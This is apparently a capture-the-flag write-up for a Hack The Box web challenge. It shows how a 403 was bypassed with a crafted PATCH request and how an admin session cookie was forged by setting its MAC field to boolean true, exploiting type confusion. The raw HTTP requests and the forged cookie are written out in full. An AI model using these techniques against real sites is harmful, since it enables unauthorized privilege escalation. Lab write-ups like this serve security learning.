# Grammar
## Bypassing 403

This challenge greets us with a lovely '403 Forbidden' message and there's not much more to look at. So let's fuzz things!
### Starting trivially
- Dirbuster lists
- Directory traversal lists
- User agent string
- Maybe a blocked ip?

But no luck with that. Attacking Apache vulnerabilities seems beyond the scope of this challenge, so continue looking.

### What about grammar tho?

And that is it, HTTP __verbs__ is the way to go. The idea is to change file permissions using PUT/PATCH request.

Crafting the request
```
PATCH /index.php HTTP/1.1
Host: 88.198.233.174:33295
Content-Type: application/json
Content-Length: 45

{executable:true,readable:true,writable:true}

```

Response
```
HTTP/1.1 200 OK
Date: Fri, 20 Oct 2017 18:14:34 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: ses=eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IkZhbHNlIiwiTUFDIjoiZmY2ZDBhNTY4ZDYxZTVhMDNiY2RiMDQ1MDlkNTg4NWQifQ%3D%3D
Vary: Accept-Encoding
Content-Length: 382
Content-Type: text/html; charset=UTF-8
```

Killed it, right?

This is what appears next

```html
<html>
<body>
<form action="index.php" method="post">
Change Username: <br>
<input type="text" name="fuckhtml" placeholder="notimportant">
<!-- HTB hint:really not important...totaly solvable without using it! Just there to fill things and to save you from some trouble you might get into :) -->
<input type="submit" value="Change">
</form>
</body>
</html>
not an admin (yet)
```
## Becoming an admin

Getting back to the cookie received from the server
```
ses=eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IkZhbHNlIiwiTUFDIjoiZmY2ZDBhNTY4ZDYxZTVhMDNiY2RiMDQ1MDlkNTg4NWQifQ%3D%3D
```
Decoding from base64
```
{"User":"whocares","Admin":"False","MAC":"ff6d0a568d61e5a03bcdb04509d5885d"}
```
The obvious thing would be to change 'Admin' to 'True', but it is not enough. This does not match against MAC checksum, to which the server responds:
```html
...
</body>
</html>
what are you trying to do huh?
```
There is probably a way to do a cryptanalysis on this thing, but there should be something less time-consuming. And there is, it is type confusion.

Instead of passing a string for a MAC value, attempt to pass something else.
```
{"User":"whocares","Admin":"True","MAC":true}
```
Base64 & url encoded & all done
```
POST /index.php HTTP/1.1
Host: 88.198.233.174:33367
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://88.198.233.174:33295/index.php
Cookie: ses=eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IlRydWUiLCJNQUMiOnRydWV9%3D%3D
```

_P.S.: they were also kind enough to give MAC generation algorithm with the flag_

![Sick Algo](https://i.imgur.com/m1OOHuE.png "Sick algo")
